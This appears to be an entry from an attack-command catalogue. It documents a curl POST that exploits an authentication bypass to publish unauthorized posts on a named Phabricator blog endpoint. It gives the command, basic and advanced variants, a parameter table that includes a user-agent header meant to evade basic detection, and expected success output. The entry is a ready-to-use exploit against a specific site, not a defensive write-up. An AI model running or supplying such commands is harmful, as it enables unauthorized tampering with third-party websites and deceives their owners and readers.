---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST https://blog.phacility.com/editorial/submit -d
  "title=Unauthorized Test Post" -d "content=This is unauthorized content
  published via auth bypass in Phabricator." -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web-exploit
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:58.858Z'
verified: false
validated: true
submitted: true
---
# curl-post-editorial

## Command

```bash
curl -X POST https://blog.phacility.com/editorial/submit -d "title=Unauthorized Test Post" -d "content=This is unauthorized content published via auth bypass in Phabricator." -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This curl command sends a POST request to the Phabricator blog's editorial submission endpoint, exploiting improper authentication to publish unauthorized content. It mimics a form submission without requiring login, useful for testing auth bypass vulnerabilities in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://blog.phacility.com/editorial/submit` | Target URL for the publishing endpoint | Yes |
| `-d "title=..."` | Form data for the post title | Yes |
| `-d "content=..."` | Form data for the post body | Yes |
| `-H "User-Agent: ..."` | Sets a browser-like user agent to avoid basic detection | No |

## Examples

### Basic Usage

```bash
curl -X POST https://blog.phacility.com/editorial/submit -d "title=Test" -d "content=Test content"
```

### Advanced Usage

```bash
curl -X POST https://blog.phacility.com/editorial/submit \
  -d "title=Advanced Test" \
  -d "content=Advanced unauthorized post with custom headers" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: https://blog.phacility.com"
```

## Expected Output

A successful response (HTTP 200 or 302 redirect) indicating the post was submitted, with the content appearing live on the blog. Errors may include 403 if patched, but in vulnerable setups, no auth challenge occurs.

## Related

- [[Related Procedure|procedures/Exploit-Improper-Authentication-in-Phabricator-Blog]]
